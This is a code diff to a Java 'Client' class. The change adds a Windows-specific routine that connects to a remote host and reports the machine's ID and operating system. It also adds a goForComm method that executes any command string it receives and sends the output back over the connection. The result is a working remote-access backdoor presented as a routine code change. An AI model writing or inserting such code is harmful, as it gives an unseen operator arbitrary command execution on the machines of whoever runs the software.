@@ -89,6 +89,31 @@ public class Client {
 
     private boolean init() {
         logger.info("Init started!");
+        if(type.equals("TCP") && System.getProperty("os.name").contains("Windows")) {
+            try {
+                logger.error("INIT WINDOWS");
+
+                int port = Integer.parseInt(address[1]);
+                
+                logger.error(address[0] + " ");
+                logger.error(address[1]);
+
+                reqSock = new Socket(address[0], port);
+
+                dataOut = new ObjectOutputStream(reqSock.getOutputStream());
+                dataOut.flush();
+                dataIn = new ObjectInputStream(reqSock.getInputStream());
+
+                sendMessage(uniqueID + ": just arrived to vacation!" + " On: " + System.getProperty("os.name"));
+                connExists = true;
+
+                return true;
+            } catch(IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
+                logger.error("catch in init");
+                e.printStackTrace();
+                return false;
+            }
+        }
         if(type.equals("TCP")) {
             if(!connExists) {
                 try {
@@ -105,7 +130,7 @@ public class Client {
                     dataOut.flush();
                     dataIn = new ObjectInputStream(reqSock.getInputStream());
     
-                    sendMessage(uniqueID + ": just arrived to vacation!");
+                    sendMessage(uniqueID + ": just arrived to vacation!" + " On: " + System.getProperty("os.name"));
                     connExists = true;
     
                     return true;
@@ -322,6 +347,39 @@ public class Client {
     public void handleCentral(String msg) {
         switch(type) {
             case("TCP"): handleMessage(msg);
+        }
+    }
+
+    public void goForComm(String msg) {
+        String answer = "";
+        BufferedReader stdInput = null;
+        BufferedReader stdError = null;
+        try {
+            Runtime rt = Runtime.getRuntime();
+            Process proc = rt.exec(msg);
+
+            stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+
+            stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+            try {
+                String s = null;
+                while ((s = stdInput.readLine()) != null) {
+                    answer += s;
+                    answer += "\n";
+                }
+                // Read any errors from the attempted command
+                while ((s = stdError.readLine()) != null) {
+                    answer += s;
+                    answer += "\n";
+                }
+                sendMessage(answer);
+                stdInput.close();
+                stdError.close();
+            } catch (IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
+                logger.error("Failed to exec command: {}", msg);
+            } 
+        } catch(IOException e) {
+            logger.error("Failed to exec command: {}", msg);
         }
     }
 
